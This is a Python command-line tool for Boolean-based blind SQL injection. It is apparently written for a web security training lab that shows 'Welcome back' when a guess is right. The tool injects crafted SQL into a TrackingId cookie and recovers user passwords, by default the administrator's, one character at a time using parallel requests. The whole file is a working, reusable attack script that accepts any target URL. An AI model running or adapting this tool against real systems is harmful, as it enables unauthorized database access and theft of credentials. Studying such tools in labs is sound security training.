#!/usr/bin/env python3
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from colorama import Fore, Style

try:
    from tools.common import (
        DEFAULT_HEADERS, setup_logger, banner, log_info, log_warn, log_error,
        build_charset, make_session, make_proxies, timestamp_log_name,
        prompt_url, prompt_tracking, prompt_cookie_name, prompt_session_cookie,
        prompt_users, prompt_length, prompt_proxy, prompt_workers,
        prompt_special, prompt_timeout
    )
except ImportError:
    from common import (
        DEFAULT_HEADERS, setup_logger, banner, log_info, log_warn, log_error,
        build_charset, make_session, make_proxies, timestamp_log_name,
        prompt_url, prompt_tracking, prompt_cookie_name, prompt_session_cookie,
        prompt_users, prompt_length, prompt_proxy, prompt_workers,
        prompt_special, prompt_timeout
    )


class BooleanSQLiEngine:
    def __init__(self, args):
        self.url = args.url
        self.base_id = args.tracking
        self.cookie_name = args.cookie
        self.session_cookie = args.session
        self.target_users = [u.strip() for u in args.users.split(',') if u.strip()]
        self.length = args.length
        self.use_special = args.special
        self.workers = max(1, args.workers)
        self.timeout = args.timeout
        self.log_file = args.log
        self.logger = setup_logger(self.log_file, "BooleanSQLi")
        self.headers = dict(DEFAULT_HEADERS)
        self.proxies = make_proxies(args.proxy)
        self.charset = build_charset(self.use_special)
        self.session = make_session()
        self.success_indicator = getattr(args, "success_indicator", "Welcome back")

    def _build_char_payload(self, user, position, char):
        return (
            f"{self.base_id}' and (select substring(password,{position},1) "
            f"from users where username='{user}')='{char}'--"
        )

    def _build_probe_payload(self, user):
        return (
            f"{self.base_id}' and (select username from users "
            f"where username='{user}' and LENGTH(password)>1)='{user}'--"
        )

    def _send_request(self, payload):
        cookies = {self.cookie_name: payload}
        if self.session_cookie:
            cookies["session"] = self.session_cookie
        try:
            r = self.session.get(
                self.url, cookies=cookies, headers=self.headers,
                proxies=self.proxies, verify=False, timeout=self.timeout,
                allow_redirects=False
            )
            return self.success_indicator in r.text
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return False

    def _probe(self, user):
        log_info("Probing Boolean-based injection...")
        if self._send_request(self._build_probe_payload(user)):
            log_info(f"Boolean payload confirmed (indicator: '{self.success_indicator}')")
            return True
        log_error("Boolean probe failed. Check URL/cookie/session or success indicator.")
        return False

    def _extract_char(self, user, position):
        found = None
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = {}
            for c in self.charset:
                futs[ex.submit(self._send_request, self._build_char_payload(user, position, c))] = c
            for fut in as_completed(futs):
                c = futs[fut]
                try:
                    if fut.result():
                        found = c
                        for f in futs:
                            if not f.done():
                                f.cancel()
                        break
                except Exception as e:
                    self.logger.debug(f"Future error: {e}")
        return found

    def extract_password(self, user):
        log_info(f"Starting extraction for user: {Fore.CYAN}{user}{Style.RESET_ALL}")
        if not self._probe(user):
            return None
        log_info(f"Using provided length: {self.length}")
        password = ""
        for pos in range(1, self.length + 1):
            sys.stdout.write(f"\r[+] {user} | Pos {pos}/{self.length} | Current: {Fore.YELLOW}{password}{Style.RESET_ALL} ")
            sys.stdout.flush()
            c = self._extract_char(user, pos)
            if c:
                password += c
                self.logger.info(f"Position {pos}: Found '{c}'")
            else:
                log_warn(f"Character not found at position {pos}. Stopping.")
                break
        sys.stdout.write("\n")
        return password

    def run(self):
        results = {}
        for user in self.target_users:
            log_info(f"{'='*20} Target: {user} {'='*20}")
            pwd = self.extract_password(user)
            if pwd:
                results[user] = pwd
                log_info(f"Success! Password for {Fore.CYAN}{user}{Style.RESET_ALL} is: {Fore.GREEN}{pwd}{Style.RESET_ALL}")
            else:
                log_error(f"Failed to extract password for {user}.")
        self._summary(results)

    def _summary(self, results):
        print(f"\n{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA} FINAL RESULTS — BOOLEAN MODE {Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        for u, p in results.items():
            print(f"{Fore.CYAN}{u:15} {Style.RESET_ALL} : {Fore.GREEN}{p}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"\n[+] Results logged to: {self.log_file}")


def interactive():
    banner(subtitle="B O O L E A N   M O D E   ( W e l c o m e   B a c k )")
    print(f"\n{Fore.YELLOW}[*] Interactive Mode — Boolean-based lab{Style.RESET_ALL}\n")
    args = argparse.Namespace()
    args.url = prompt_url()
    args.tracking = prompt_tracking()
    args.cookie = prompt_cookie_name()
    args.session = prompt_session_cookie()
    args.users = prompt_users()
    args.length = prompt_length()
    args.proxy = prompt_proxy()
    args.workers = prompt_workers(default=1)
    args.timeout = prompt_timeout()
    args.special = prompt_special()
    args.log = timestamp_log_name("boolean_sqli")
    args.success_indicator = "Welcome back"
    return args


def build_parser():
    p = argparse.ArgumentParser(description="Boolean-based Blind SQLi (Welcome back lab)")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-t", "--tracking", default="182--")
    p.add_argument("-c", "--cookie", default="TrackingId")
    p.add_argument("-sc", "--session", default=None)
    p.add_argument("-usr", "--users", default="administrator")
    p.add_argument("-l", "--length", type=int, required=True, help="Password length (REQUIRED)")
    p.add_argument("-p", "--proxy", default=None)
    p.add_argument("-w", "--workers", type=int, default=1)
    p.add_argument("-T", "--timeout", type=int, default=15)
    p.add_argument("-s", "--special", action="store_true")
    p.add_argument("-o", "--log", default=timestamp_log_name("boolean_sqli"))
    p.add_argument("--success-indicator", default="Welcome back", help="Success string in response")
    return p


def main():
    if len(sys.argv) == 1:
        args = interactive()
    else:
        args = build_parser().parse_args()

    if not args.url.startswith(("http://", "https://")):
        log_error("URL must start with http:// or https://")
        sys.exit(1)

    if not args.length or args.length <= 0:
        log_error("Password length (-l) is required and must be positive.")
        sys.exit(1)

    engine = BooleanSQLiEngine(args)
    try:
        engine.run()
    except KeyboardInterrupt:
        log_warn("\n[!] Interrupted by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()